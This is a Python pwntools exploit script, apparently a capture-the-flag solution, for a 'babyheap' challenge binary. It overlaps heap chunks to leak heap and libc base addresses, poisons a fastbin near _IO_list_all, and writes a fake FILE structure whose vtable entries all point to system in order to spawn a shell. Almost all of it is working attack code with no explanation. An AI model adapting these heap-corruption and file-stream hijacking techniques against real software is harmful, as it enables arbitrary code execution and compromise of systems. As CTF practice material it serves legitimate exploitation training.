from pwn import *

context.log_level = 'debug'

"""
[256][256][256][256]
"""

def rc():
    r.recvuntil('Command: ')

def alloc(size):
    rc()
    r.send("1\n")
    r.recvuntil("Size: ")
    r.send("%d\n" % size)
    r.readline()

def free(idx):
    rc()
    r.send("3\n")
    r.recvuntil("Index: ")
    r.send("%d\n" % idx)

def fill(idx, data):
    rc()
    r.send("2\n")
    r.recvuntil("Index: ")
    r.send("%d\n" % idx)
    r.recvuntil("Size: ")
    r.send("%d\n" % len(data))
    r.recvuntil("Content: ")
    r.send(data)

def dump(idx):
    rc()
    r.send("4\n")
    r.recvuntil("Index: ")
    r.send("%d\n" % idx)
    r.recvuntil("Content: \n")
    tag = "1. Allocate"
    data = r.recvuntil(tag)
    return data[:-len(tag)]


r = process('babyheap_69a42acd160ab67a68047ca3f9c390b9')
alloc(0x100 - 8)
alloc(0x100 - 8) # free
alloc(0x100 - 8)
alloc(0x100 - 8) # free
alloc(0x100 - 8)
alloc(0x100 - 8) # free
alloc(0x100 - 8)

free(1)
fill(0, "A" * (0x100 - 8) + p64(0x601))
alloc(0x600 - 8)
fill(1, "A" * (0x200 - 8) + p64(0x101)
        + "A" * (0x100 - 8) + p64(0x101)
        + "A" * (0x100 - 8) + p64(0x101)
        + "A" * (0x100 - 8) + p64(0x101))
free(3)
free(5)
out = dump(1)[0x400:]
heap_base = u64(out[:8]) - 0x300
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
libc.address = u64(out[8:16]) - 0x3c3b78

print("LIBC_BASE: %16X" % libc.address)
print("HEAP_BASE: %16X" % heap_base)

raw_input('1\n')
alloc(0x60) # fast bin
list_all = libc.symbols['_IO_list_all'] + 5
free(3)
fill(1, "A" * (0x200 - 8) + p64(0x0000000000000071) + p64(list_all - 8))
raw_input('2\n')
alloc(0x60)
alloc(0x60)
"""
0x7f3948d15540 <_IO_2_1_stderr_>:       0x00000000fbad2086      0x0000000000000000
0x7f3948d15550 <_IO_2_1_stderr_+16>:    0x0000000000000000      0x0000000000000000
0x7f3948d15560 <_IO_2_1_stderr_+32>:    0x0000000000000000      0x0000000000000000
0x7f3948d15570 <_IO_2_1_stderr_+48>:    0x0000000000000000      0x0000000000000000
0x7f3948d15580 <_IO_2_1_stderr_+64>:    0x0000000000000000      0x0000000000000000
0x7f3948d15590 <_IO_2_1_stderr_+80>:    0x0000000000000000      0x0000000000000000
0x7f3948d155a0 <_IO_2_1_stderr_+96>:    0x0000000000000000      0x00007f3948d15620
0x7f3948d155b0 <_IO_2_1_stderr_+112>:   0x0000000000000002      0xffffffffffffffff
0x7f3948d155c0 <_IO_2_1_stderr_+128>:   0x0000000000000000      0x00007f3948d16770
0x7f3948d155d0 <_IO_2_1_stderr_+144>:   0xffffffffffffffff      0x0000000000000000
0x7f3948d155e0 <_IO_2_1_stderr_+160>:   0x00007f3948d14660      0x0000000000000000
0x7f3948d155f0 <_IO_2_1_stderr_+176>:   0x0000000000000000      0x0000000000000000
0x7f3948d15600 <_IO_2_1_stderr_+192>:   0x0000000000000000      0x0000000000000000
0x7f3948d15610 <_IO_2_1_stderr_+208>:   0x0000000000000000      0x00007f3948d136e0
"""

# get this idea from jinmo's writeup
fake_file_struct = ("sh\n".ljust(8, "\x00")
        + p64(0x0000000000000000) * 12
        + "A" * 8
        + p64(2)
        + p64(0xffffffffffffffff)
        + p64(0)
        + p64(libc.symbols['_IO_2_1_stderr_'] + 0x1230)
        + p64(0xffffffffffffffff)
        + p64(0x0000000000000000)
        + "C" * 8
        + p64(0x0000000000000000) * 6)

fake_vtable_addr = libc.symbols['_IO_2_1_stdout_'] + len(fake_file_struct) + 8 * 3
fake_file_struct += p64(fake_vtable_addr) + p64(libc.symbols['_IO_2_1_stdout_']) * 2
fake_vtable = p64(libc.symbols['system']) * 21

off = libc.symbols['_IO_2_1_stdout_'] - (libc.symbols['_IO_list_all'] + 5) - 8
payload = "A" * off + fake_file_struct + fake_vtable
fill(5, payload)
raw_input('3\n')

r.interactive()
